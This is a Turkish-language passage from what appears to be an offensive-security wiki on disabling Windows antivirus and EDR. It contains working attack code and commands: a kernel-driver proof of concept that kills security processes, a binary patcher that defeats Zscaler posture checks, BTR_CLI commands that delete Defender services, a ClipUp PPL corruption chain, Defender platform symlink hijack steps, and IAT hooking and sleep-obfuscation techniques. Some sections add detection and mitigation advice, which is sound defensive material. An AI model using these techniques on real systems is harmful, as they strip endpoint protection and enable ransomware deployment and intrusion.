Storm-2603, ransomware bırakmadan önce uç nokta korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir konsol yardımcı programından yararlandı. Araç **kendi güvenlik açığı bulunan ama *imzalı* sürücüsünü** beraberinde getirir ve bu sürücüyü, Protected-Process-Light (PPL) AV hizmetlerinin bile engelleyemediği ayrıcalıklı kernel işlemlerini gerçekleştirmek için kötüye kullanır.<sup>[[12]](#references)</sup>

Önemli noktalar
1. **İmzalı sürücü**: Diske bırakılan dosya `ServiceMouse.sys` olsa da ikili dosya, Antiy Labs’ın “System In-Depth Analysis Toolkit” aracına ait, yasal olarak imzalanmış `AToolsKrnl64.sys` sürücüsüdür. Sürücü geçerli bir Microsoft imzası taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Hizmet kurulumu**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   İlk satır sürücüyü bir **kernel service** olarak kaydeder, ikinci satır ise onu başlatarak `\\.\ServiceMouse` aygıtının user land üzerinden erişilebilir olmasını sağlar.
3. **Sürücünün sunduğu IOCTL'ler**
   | IOCTL kodu | Yetenek                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID ile rastgele bir işlemi sonlandırma (Defender/EDR hizmetlerini sonlandırmak için kullanılır) |
   | `0x990000D0` | Diskteki rastgele bir dosyayı silme |
   | `0x990001D0` | Sürücüyü kaldırma ve hizmeti silme |

   Minimal C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Neden işe yarıyor**: BYOVD, kullanıcı modu korumalarını tamamen atlar; kernel'de çalışan kod, PPL/PP, ELAM veya diğer güçlendirme özelliklerinden bağımsız olarak *korunan* süreçleri açabilir, sonlandırabilir ya da kernel nesnelerine müdahale edebilir.

Tespit / Azaltma
• Microsoft’un güvenlik açığı bulunan sürücü engelleme listesini (`HVCI`, `Smart App Control`) etkinleştirin; böylece Windows `AToolsKrnl64.sys` dosyasının yüklenmesini reddeder.
• Yeni *kernel* hizmetlerinin oluşturulmasını izleyin ve sürücünün herkes tarafından yazılabilir bir dizinden yüklenmesi veya izin verilenler listesinde bulunmaması durumunda uyarı verin.
• Özel aygıt nesnelerine yönelik kullanıcı modu tanıtıcılarını ve ardından gelen şüpheli `DeviceIoControl` çağrılarını izleyin.

### Disk Üzerindeki İkili Dosyaları Yamayarak Zscaler Client Connector Duruş Denetimlerini Atlatma

Zscaler’ın **Client Connector** uygulaması, cihaz duruşu kurallarını yerel olarak uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC'ye güvenir. İki zayıf tasarım tercihi tam bir atlatmayı mümkün kılar:

1. Duruş değerlendirmesi **tamamen istemci tarafında** gerçekleşir (sunucuya bir boolean gönderilir).
2. Dahili RPC uç noktaları yalnızca bağlanan yürütülebilir dosyanın **Zscaler tarafından imzalanmış** olduğunu (`WinVerifyTrust` aracılığıyla) doğrular.<sup>[[11]](#references)</sup>

**Disk üzerindeki dört imzalı ikili dosyayı yamalayarak** her iki mekanizma da etkisiz hâle getirilebilir:

| İkili dosya | Yamalanan özgün mantık | Sonuç |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür; böylece her denetim uyumlu olur |
| `ZSAService.exe` | `WinVerifyTrust` işlevine dolaylı çağrı | NOP'lanır ⇒ herhangi bir süreç (imzasız olanlar dâhil) RPC kanallarına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirilir |
| `ZSATunnel.exe` | Tüneldeki bütünlük denetimleri | Kısa devre edilir |

En küçük yama uygulayıcı kodundan bir alıntı:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Orijinal dosyaları değiştirdikten ve hizmet yığınını yeniden başlattıktan sonra:

* **Tüm** duruş denetimleri **uyumlu/yeşil** görünür.
* İmzasız veya değiştirilmiş ikili dosyalar, adlandırılmış pipe RPC uç noktalarını açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ele geçirilmiş ana bilgisayar, Zscaler politikalarında tanımlanan iç ağa kısıtlanmamış erişim kazanır.

Bu vaka çalışması, tamamen istemci tarafındaki güven kararlarının ve basit imza denetimlerinin birkaç baytlık yamayla nasıl aşılabileceğini gösteriyor.

## Microsoft Defender `BTR.sys` güvenilir işlevsellik suistimali

Defender'ın **Boot-Time Removal** sürücüsü, klasik BYOVD'ye yararlı bir karşı örnektir. `BTR.sys`, bellek bozulması hatası ve IOCTL arayüzü olmayan, Microsoft tarafından imzalanmış meşru bir düzeltme bileşenidir; yönetici erişimi ve `SeLoadDriverPrivilege` elde edildikten sonra operatör, bunun yerine özel düzeltme işlemini taklit ederek tasarlandığı şekilde Ring-0 dosya/kayıt defteri işlemleri gerçekleştirebilir. Bu, **ilk erişim veya ayrıcalık yükseltme değil, ele geçirilme sonrasında kullanılan bir AV/EDR etkisizleştirme tekniğidir** ve sürücü, dikkat çeken bir üçüncü taraf sürücüyü içe aktarmak yerine hedefin kendi `MpEngine.dll` dosyasındaki `BOOTTIMETOOL` kaynağından çıkarılabilir.<sup>[[36]](#references)</sup>

### Tek kullanımlık sürücünün hazırlanması

Defender normalde kaynağı rastgele bir `[a-z]{8}.sys` dosyası olarak bırakır ve benzer ad taşıyan bir kernel hizmeti kaydeder. `DriverEntry`, hizmetin `Args` değerini okur, başvurulan NTFS ADS'yi açar, eylem listesinin şifresini çözüp doğrular, geri bildirim yazar ve başarılı yürütmenin ardından `0xC0000056` (`STATUS_DELETE_PENDING`) döndürür; böylece sürücü bellekte kalmak yerine yükünü kaldırır. Taklit edilmiş bir hizmetin aşağıdaki karakteristik değerleri vardır.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` stream'i, RC4 ile şifrelenmiş tek bir blob içerir. Analiz edilen build'ler sabit 256 baytlık bir anahtarı yeniden kullandığından, şifreleme bir yetkilendirme sınırı değildir. Geçerli bir plaintext; 24 baytlık genel bir header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, header CRC ve payload'dan türetilen bir transaction ID), ardından null ile sonlandırılmış bir UTF-16 feedback path ve istenen sayıda öğeden oluşur. Her öğe, 16 baytlık bir header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) ve **tam olarak dört NUL baytıyla** biten eyleme özgü veriler içerir. Her header/veri bölgesi, CRC-32 polinomu `0xEDB88320`, başlangıç durumu `0xFFFFFFFF` ve **son XOR olmadan** (`~CRC32`) ayrı ayrı kontrol edilir; her bölge için CRC durumu sıfırlanır.<sup>[[36]](#references)[[37]](#references)</sup>

Kabul edilen action ID'leri, bu kernel primitive'lerini ortaya çıkarır.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Öğe verisi | Sonuç |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Kilitli dosyalar da dahil olmak üzere bir dosyayı siler |
| 2 | `[UTF-16 path]` | Boş bir dizini kaldırır |
| 3 | `[Flags][source][destination]` | Bir dosyayı saldırganın seçtiği korumalı bir path'e taşır; boş destination, silme anlamına gelir |
| 4 | `[Flags][key path]` | Bir registry key'i özyinelemeli olarak siler |
| 5 | `[Flags][key path + "\\" + value]` | Bir registry value'yu siler |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Bir registry value oluşturur/günceller ve eksik key path'lerini oluşturur |

5 ve 6 numaralı action'larda, wire üzerindeki key/value ayıracı **ardışık iki ters eğik çizgidir**; alışılagelmiş biçimde yazılmış bir path doğru şekilde bölünmez. Feedback dosyası çoğunlukla isteği yansıtır, ancak her öğenin ilk dört veri baytı, sonuçta oluşan `NTSTATUS` değerini alır. Önde gelen flags alanı bulunmayan 1 ve 2 numaralı action'larda BTR, bu durum koduna yer açmak için path'i ayrılmış dört son bayta kaydırır.<sup>[[36]](#references)</sup>

### `BTR_CLI` iş akışı ve erken önyükleme aralığı

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI), zincirin tamamını uygular: yerel Defender'dan `BTR.sys` dosyasını çıkarır, `<random>.sys:changelist` ve bir feedback stream oluşturur, zincirleme action'ları serileştirir/kontrol toplamlarını hesaplar/şifreler, service registry key'ini doğrudan oluşturur ve ardından `-trigger now` için `NtLoadDriver`'ı çağırır veya `-trigger boot` için sürücüyü system-start sürücüsü olarak bırakır. Registry'nin doğrudan hazırlanması, normal SCM `CreateServiceW` yolunu atlar ve bu nedenle service-install Event ID 7045 oluşturmaz. Önyükleme tetiklemeli yapılar daha sonra `BTR_CLI.exe -cleanup <service_name>` ile kaldırılabilir.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` kullanılamaz; çünkü BTR, storage stack ve `SystemRoot` link hazır olmadan önce `DriverEntry` içinden file I/O gerçekleştirir. `Start=1` ve yüksek öncelikli `Boot Bus Extender` grubu ise Phase 1'de çalışır: NTFS kullanılabilir durumdadır, ancak birçok system-start security driver'ı ve user-mode EDR service'i henüz başlatılmamıştır. `WdFilter` gibi boot-start filter'lar önceden yüklenmiş olabilir; ancak BTR, sonraki başlangıçtan önce bunların binary dosyalarını veya service configuration'larını kaldırabilir ve SCM bunları başlatmadan önce service executable dosyalarını silebilir. BTR, boot-start değerlendirmesinden sonra çalıştığı ve geçerli bir Microsoft signature taşıdığı için ELAM bu açığı kapatmaz.<sup>[[36]](#references)</sup>

Birden fazla işlem tek bir transaction içinde yürütülür. PoC, sabit kodlanmış `\SystemRoot\Temp\BootClean.log` için Action 1'i başa ekler: BTR bu log'u oluşturur, ardından kendi silme isteğini işler ve unload olmadan önce dosyayı kaldırır. Bu, kanıt miktarını azaltırken geri bildirimin `<random>.sys:<random>.dat` içine yerleştirilmesi driver'ın ve her iki stream'in birlikte kaldırılmasını sağlar.<sup>[[36]](#references)[[37]](#references)</sup>

### Yüksek sinyalli tespit korelasyonları

Yalnızca signature kullanan kurallar ve Microsoft vulnerable-driver blocklist'i, BTR'nin amaçlanan işlevlerinin kötüye kullanılmasını önlemez. Meşru Defender kaynaklı işlemleri rastgele bir launcher'dan ayırt ederken bu davranışsal korelasyonları tercih edin.<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` oluşturulması, BTR staging işlemlerinin tamamında görülür. Aynı `.sys` dosyasına eklenmiş bir `.dat` ADS özellikle şüphelidir; çünkü meşru Defender genellikle geri bildirimi `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` altına yerleştirir.
- **System 7045 olmadan Sysmon 12/13:** Eşleşen bir SCM installation event'i olmadan `Args=...:changelist` ve `Group=Boot Bus Extender` içeren `HKLM\SYSTEM\CurrentControlSet\Services\<random>` konumuna doğrudan yapılan oluşturma işlemlerini korele edin.
- **Sysmon 6 -> 23:** Defender dışı bilinen bir kaynaktan yüklenen BTR driver'ını, özellikle security binary'leri için `System`/PID 4'e atfedilen sonraki file deletion işlemiyle korele edin.
- **Sysmon 11 -> 23:** `System`/PID 4 tarafından `\SystemRoot\Temp\BootClean.log` dosyasının kısa sürede oluşturulup silinmesi durumunda alarm üretin.
- `SeLoadDriverPrivilege` atamasını/etkinleştirilmesini kısıtlayın ve denetleyin; `cmd.exe`, PowerShell veya bilinmeyen bir process tarafından security-tool driver'ı staging işlemine tabi tutulduğunda, yalnızca Microsoft signature'ı bulunması yeterli bir güvence değildir.

## LOLBIN'lerle AV/EDR'ye Müdahale Etmek İçin Protected Process Light (PPL) Kötüye Kullanımı

Protected Process Light (PPL), yalnızca aynı veya daha yüksek koruma seviyesindeki process'lerin birbirlerine müdahale edebilmesini sağlayan bir signer/level hiyerarşisi uygular. Saldırgan tarafında, PPL etkinleştirilmiş bir binary'yi meşru şekilde başlatabiliyor ve argümanlarını kontrol edebiliyorsanız, logging gibi zararsız bir işlevi AV/EDR tarafından kullanılan korumalı dizinlere yazma yapabilen, kısıtlı ve PPL destekli bir primitive'e dönüştürebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Bir process'in PPL olarak çalışmasını sağlayanlar
- Hedef EXE (ve yüklenen tüm DLL'ler) PPL destekli bir EKU ile imzalanmış olmalıdır.
- Process, şu flag'lerle CreateProcess kullanılarak oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Binary'nin signer'ıyla eşleşen uyumlu bir protection level istenmelidir (ör. anti-malware signer'lar için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signer'lar için `PROTECTION_LEVEL_WINDOWS`). Yanlış seviyeler, oluşturma işleminin başarısız olmasına neden olur.

PP/PPL ve LSASS protection hakkında daha geniş bir giriş için ayrıca bkz.:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher araçları
- Açık kaynaklı yardımcı araç: CreateProcessAsPPL (protection level'ı seçer ve argümanları hedef EXE'ye iletir):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Kullanım örüntüsü:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- İmzalı sistem binary'si `C:\Windows\System32\ClipUp.exe` kendisini yeniden başlatır ve çağıranın belirttiği bir yola log dosyası yazmak için parametre kabul eder.
- PPL process olarak başlatıldığında dosya yazma işlemi PPL yetkileriyle gerçekleşir.
- ClipUp, boşluk içeren yolları ayrıştıramaz; normalde korunan konumları belirtmek için 8.3 kısa yolları kullanın.

8.3 kısa yol yardımcıları
- Kısa adları listeleyin: Her üst dizinde `dir /x` komutunu çalıştırın.
- cmd'de kısa yol türetin: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (soyut)
1) Bir launcher (ör. CreateProcessAsPPL) kullanarak PPL çalıştırabilen LOLBIN'i (ClipUp) `CREATE_PROTECTED_PROCESS` ile başlatın.
2) Korunan bir AV dizininde (ör. Defender Platform) dosya oluşturulmasını zorlamak için ClipUp log-path argümanını iletin. Gerekirse 8.3 kısa adlarını kullanın.
3) Hedef binary çalışırken AV tarafından normalde açık tutuluyor/kilitleniyorsa (ör. MsMpEng.exe), AV başlamadan önce boot sırasında yazma işlemini zamanlamak için daha erken çalıştığı güvenilir biçimde bilinen bir auto-start service kurun. Process Monitor ile boot sıralamasını doğrulayın (boot logging).
4) Yeniden başlatmada PPL yetkileriyle yapılan yazma işlemi, AV binary'lerini kilitlemeden önce gerçekleşir; hedef dosyayı bozarak başlangıcı engeller.

Örnek çalıştırma (güvenlik için yollar gizlenmiş/kısaltılmış):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notes and constraints
- ClipUp’ın yazdığı içeriği yerleşim dışında kontrol edemezsiniz; bu primitive, hassas içerik enjeksiyonundan ziyade bozulma için uygundur.
- Bir hizmeti yüklemek/başlatmak ve yeniden başlatma aralığı için local admin/SYSTEM gerekir.
- Zamanlama kritiktir: hedef açık olmamalıdır; önyükleme sırasında çalıştırmak dosya kilitlerini önler.

Detections
- Özellikle standart dışı launcher’ların alt süreci olarak önyükleme sırasında olağandışı argümanlarla `ClipUp.exe` işleminin oluşturulması.
- Şüpheli binary’leri otomatik başlayacak şekilde yapılandıran ve sürekli olarak Defender/AV’den önce başlayan yeni hizmetler. Defender başlatma hatalarından önce hizmet oluşturma/değiştirme işlemlerini araştırın.
- Defender binary’leri/Platform dizinlerinde dosya bütünlüğü izleme; korumalı işlem bayraklarına sahip süreçlerin beklenmeyen dosya oluşturma/değiştirme işlemleri.
- ETW/EDR telemetrisi: `CREATE_PROTECTED_PROCESS` ile oluşturulan süreçleri ve AV dışı binary’lerin anormal PPL seviyesi kullanımını araştırın.

Mitigations
- WDAC/Code Integrity: PPL olarak hangi imzalı binary’lerin ve hangi üst süreçlerin altında çalışabileceğini kısıtlayın; ClipUp’ın meşru bağlamlar dışında çalıştırılmasını engelleyin.
- Hizmet güvenliği: otomatik başlayan hizmetlerin oluşturulmasını/değiştirilmesini kısıtlayın ve başlangıç sırası üzerinde oynanmasını izleyin.
- Defender tamper protection ve erken başlatma korumalarının etkin olduğundan emin olun; binary bozulmasına işaret eden başlangıç hatalarını araştırın.
- Ortamınızla uyumluysa güvenlik araçlarını barındıran birimlerde 8.3 kısa ad oluşturmayı devre dışı bırakmayı değerlendirin (iyice test edin).

## Platform Version Klasörü Symlink Hijack ile Microsoft Defender’a Müdahale

Windows Defender, çalışacağı platformu şu konumun altındaki alt klasörleri listeleyerek seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

En yüksek leksikografik sürüm dizgesine sahip alt klasörü (ör. `4.18.25070.5-0`) seçer ve ardından Defender hizmet süreçlerini bu klasörden başlatır (hizmet/kayıt defteri yollarını da buna göre günceller). Bu seçim, dizin symlink’leri dahil olmak üzere dizin girdilerine güvenir. Bir yönetici, Defender’ı saldırganın yazabildiği bir yola yönlendirmek ve DLL sideloading veya hizmet kesintisi sağlamak için bundan yararlanabilir.<sup>[[21]](#references)[[22]](#references)</sup>

Önkoşullar
- Local Administrator (Platform klasöründe dizin/symlink oluşturmak için gerekir)
- Yeniden başlatma veya Defender platformunun yeniden seçilmesini tetikleme olanağı (önyüklemede hizmetin yeniden başlatılması)
- Yalnızca yerleşik araçlar gerekir (mklink)

Neden işe yarar
- Defender kendi klasörlerine yazılmasını engeller; ancak platform seçimi dizin girdilerine güvenir ve hedefin korumalı/güvenilir bir yola çözümlendiğini doğrulamadan en yüksek leksikografik sürümü seçer.

Adım adım (örnek)
1) Geçerli platform klasörünün yazılabilir bir kopyasını hazırlayın; ör. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde, klasörünüze işaret eden daha yüksek sürüm numaralı bir dizin symlink'i oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) sürecinin yönlendirilen yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Yeni işlem yolunun `C:\TMP\AV\` altında olduğunu ve hizmet yapılandırması/kayıt defterinin bu konumu yansıttığını gözlemlemelisiniz.

Post-exploitation seçenekleri
- DLL sideloading/code execution: Defender’ın kendi işlemlerinde kod çalıştırmak için Defender’ın uygulama dizininden yüklediği DLL’leri bırakın/değiştirin. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Hizmeti sonlandırma/hizmet engelleme: Sürüm symlink’ini kaldırın; böylece bir sonraki başlatmada yapılandırılmış yol çözümlenemez ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Bu tekniğin tek başına ayrıcalık yükseltme sağlamadığını; yönetici hakları gerektirdiğini unutmayın.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red Team'ler, runtime evasion işlemlerini C2 implantından çıkarıp hedef modülün içine taşıyabilir. Bunun için modülün Import Address Table'ını (IAT) hook'layıp seçili API'leri saldırganın denetimindeki, konumdan bağımsız koda (PIC) yönlendirirler. Bu yaklaşım, evasion işlemlerini birçok kitin sunduğu sınırlı API kapsamının (ör. CreateProcessA) ötesine taşır ve aynı korumaları BOF'lara ve post-exploitation DLL'lerine de uygular.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Üst düzey yaklaşım
- Reflective loader kullanarak hedef modülün yanına bir PIC blob'u yerleştirin (başına eklenmiş veya eşlikçi olarak). PIC kendi kendine yetmeli ve konumdan bağımsız olmalıdır.
- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR içinden geçin ve hedeflenen import'ların (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) IAT girdilerini ince PIC wrapper'larına yönlendirecek şekilde patch'leyin.
- Her PIC wrapper'ı, gerçek API adresine tail-call yapmadan önce evasion işlemlerini gerçekleştirir. Tipik evasion işlemleri şunlardır:
  - Çağrı öncesinde belleği maskeleme/maskesini kaldırma (ör. beacon bölgelerini şifreleme, RWX→RX, sayfa adlarını/izinlerini değiştirme), ardından çağrı sonrasında eski hâline döndürme.
  - Call-stack spoofing: zararsız görünen bir stack oluşturup hedef API'ye geçiş yaparak call-stack analizinde beklenen frame'lerin görünmesini sağlama.<sup>[[9]](#references)</sup>
- Uyumluluk için bir arayüz dışa aktarın; böylece bir Aggressor script (veya eşdeğeri) Beacon, BOF'lar ve post-ex DLL'ler için hangi API'lerin hook'lanacağını kaydedebilir.

Burada neden IAT hooking kullanılıyor?
- Hook'lanan import'u kullanan tüm kodlarda çalışır; araç kodunu değiştirmeyi veya belirli API'leri proxy'lemek için Beacon'a güvenmeyi gerektirmez.
- Post-ex DLL'lerini kapsar: LoadLibrary*'ı hook'lamak, modül yüklemelerini (ör. System.Management.Automation.dll, clr.dll) yakalamanıza ve bu modüllerin API çağrılarına aynı bellek maskeleme/stack evasion işlemlerini uygulamanıza olanak tanır.
- CreateProcessA/W'yi wrapper'layarak call-stack tabanlı tespitlere karşı process-spawning post-ex komutlarının güvenilir biçimde kullanılmasını sağlar.

Minimal IAT hook taslağı (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Yamayı relocations/ASLR sonrasında ve import ilk kez kullanılmadan önce uygulayın. TitanLdr/AceLdr gibi Reflective loader'lar, yüklenen modülün DllMain'i sırasında hooking yapıldığını gösterir.
- Wrapper'ları küçük ve PIC-safe tutun; gerçek API'yi yama uygulamadan önce yakaladığınız özgün IAT değerini veya LdrGetProcedureAddress'ı kullanarak çözümleyin.
- PIC için RW → RX geçişleri kullanın ve yazılabilir+çalıştırılabilir sayfalar bırakmaktan kaçının.

Call-stack spoofing stub
- Draugr tarzı PIC stub'ları sahte bir çağrı zinciri (zararsız modüllerdeki dönüş adresleri) oluşturur ve ardından gerçek API'ye geçiş yapar.
- Bu, Beacon/BOF'ların hassas API'lere yönelik kanonik stack'ler oluşturmasını bekleyen tespitleri etkisiz kılar.
- API prologue'una ulaşmadan önce beklenen frame'lerin içine yerleşmek için stack cutting/stack stitching teknikleriyle birlikte kullanın.

Operasyonel entegrasyon
- PIC ve hook'ların DLL yüklenirken otomatik olarak başlatılması için reflective loader'ı post-ex DLL'lerin başına ekleyin.
- Beacon ve BOF'ların kod değişikliği olmadan aynı evasion yolundan şeffaf biçimde yararlanması için hedef API'leri kaydeden bir Aggressor script kullanın.

Tespit/DFIR değerlendirmeleri
- IAT bütünlüğü: image dışındaki (heap/anon) adreslere çözümlenen girdiler; import pointer'larının düzenli olarak doğrulanması.
- Stack anomalileri: yüklü image'lere ait olmayan dönüş adresleri; image dışındaki PIC'e ani geçişler; tutarsız RtlUserThreadStart ancestry.
- Loader telemetrisi: süreç içinden IAT'ye yazılması, import thunk'larını değiştiren erken DllMain etkinliği, yükleme sırasında beklenmedik RX bölgelerinin oluşturulması.
- Image-load evasion: LoadLibrary* hooking yapılıyorsa, memory masking olaylarıyla ilişkili şüpheli automation/clr assembly yüklemelerini izleyin.

İlgili yapı taşları ve örnekler
- Yükleme sırasında IAT patching uygulayan reflective loader'lar (örn. TitanLdr, AceLdr)
- Memory masking hook'ları (örn. simplehook) ve stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub'ları (örn. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Resident PICO aracılığıyla import-time IAT hook'ları

Bir reflective loader'ı kontrol ediyorsanız, `ProcessImports()` **sırasında** loader'ın `GetProcAddress` pointer'ını önce hook'ları kontrol eden özel bir resolver ile değiştirerek import'ları hook'layabilirsiniz:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Geçici loader PIC'i kendini serbest bıraktıktan sonra da yaşamaya devam eden **resident PICO** (kalıcı PIC nesnesi) oluşturun.
- Loader'ın import resolver'ını değiştiren (örn. `funcs.GetProcAddress = _GetProcAddress`) bir `setup_hooks()` işlevi dışa aktarın.
- `_GetProcAddress` içinde ordinal import'ları atlayın ve `__resolve_hook(ror13hash(name))` gibi hash tabanlı bir hook araması kullanın. Hook varsa onu döndürün; yoksa gerçek `GetProcAddress` işlevine devredin.
- Hook hedeflerini link zamanında Crystal Palace `addhook "MODULE$Func" "hook"` girdileriyle kaydedin. Hook, resident PICO içinde yaşadığı için geçerliliğini korur.

Bu yöntem, yüklenen DLL'in kod bölümüne yükleme sonrası patching uygulamadan **import-time IAT yönlendirmesi** sağlar.

### Hedef PEB-walking kullanıyorsa hook'lanabilir import'ları zorlama

Import-time hook'lar yalnızca işlev gerçekten hedefin IAT'sinde bulunuyorsa devreye girer. Bir modül API'leri PEB-walk + hash yoluyla çözümlüyorsa (import girdisi yoksa), loader'ın `ProcessImports()` yolu tarafından görülebilmesi için gerçek bir import ekleyin:

- Hash'lenmiş export çözümlemesini (örn. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir referansla değiştirin.
- Derleyici bir IAT girdisi üretir; böylece reflective loader import'ları çözümlerken bu import yakalanabilir.

### `Sleep()` patching yapmadan Ekko tarzı sleep/idle obfuscation

`Sleep` işlevini patch'lemek yerine implantın kullandığı **gerçek wait/IPC primitive'lerini** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) hook'layın. Uzun beklemelerde, boşta kalma sırasında bellek içi image'i şifreleyen Ekko tarzı bir obfuscation zinciriyle çağrıyı sarmalayın:<sup>[[31]](#references)[[27]](#references)</sup>

- `NtContinue` işlevini hazırlanmış `CONTEXT` frame'leriyle çağıran bir dizi callback planlamak için `CreateTimerQueueTimer` kullanın.
- Tipik zincir (x64): image'i `PAGE_READWRITE` yapın → tam eşlenmiş image üzerinde `advapi32!SystemFunction032` aracılığıyla RC4 ile şifreleyin → engelleyici wait işlemini gerçekleştirin → RC4 ile şifreyi çözün → PE section'ları dolaşarak **section başına izinleri geri yükleyin** → tamamlandığını bildirin.
- `RtlCaptureContext` bir şablon `CONTEXT` sağlar; bunu birden fazla frame'e kopyalayın ve her adımı çağırmak için register'ları (`Rip/Rcx/Rdx/R8/R9`) ayarlayın.

Operasyonel ayrıntı: çağıranın image maskelenmiş durumdayken devam etmesi için uzun beklemelerde (örn. `WAIT_OBJECT_0`) “success” döndürün. Bu yöntem, boşta kalınan aralıklarda modülü scanner'lardan gizler ve klasik “patched `Sleep()`” imzasından kaçınır.

Tespit fikirleri (telemetri tabanlı)
- `NtContinue`'a işaret eden `CreateTimerQueueTimer` callback patlamaları.
- Büyük ve bitişik, image boyutundaki buffer'lar üzerinde kullanılan `advapi32!SystemFunction032`.
- Ardından özel section başına izin geri yüklemesi gelen geniş kapsamlı `VirtualProtect` çağrıları.

### Sleep-obfuscation gadget'ları için runtime CFG kaydı

CFG etkin hedeflerde, `jmp [rbx]` veya `jmp rdi` gibi bir fonksiyon ortasındaki gadget'a yapılan ilk indirect jump, gadget modülün CFG metadata'sında bulunmadığı için genellikle sürecin `STATUS_STACK_BUFFER_OVERRUN` ile çökmesine neden olur. Ekko/Kraken tarzı zincirleri korumalı süreçlerde çalışır durumda tutmak için:<sup>[[30]](#references)</sup>

- Zincirin kullandığı her indirect destination'ı `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ve `CFG_CALL_TARGET_VALID` girdileriyle kaydedin.
